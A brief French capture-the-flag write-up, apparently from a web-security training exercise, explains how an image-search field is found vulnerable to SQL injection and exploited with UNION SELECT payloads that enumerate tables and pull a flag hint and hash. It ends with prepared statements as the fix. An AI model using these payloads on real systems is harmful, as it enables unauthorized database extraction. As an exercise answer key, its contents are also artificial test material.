# Explications
dans la home page on vois un boutton ou l on peut rechercher une image, apres avoir clique on est rediriger sur un textfield ou il y a une injection sql possible on le voit en testant "1 or 1=1".

pour voir toutes les tables "1 or 1=1 UNION select table_name, column_name FROM information_schema.columns" on voit que une table s appel "list_images" donc on focus dessus, du coup "1 or 1=1 UNION select url, comment from list_images" nous donne 
"
ID: 1 or 1=1 UNION select url, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : borntosec.ddns.net/images.png
"
md5 unhash = albatroz

# Malveillant
une injection sql expose la db a un dump etc..

# Regler
Passer par des requetes SQL dites prepared, les ORM. (cf: PDO::prepare)
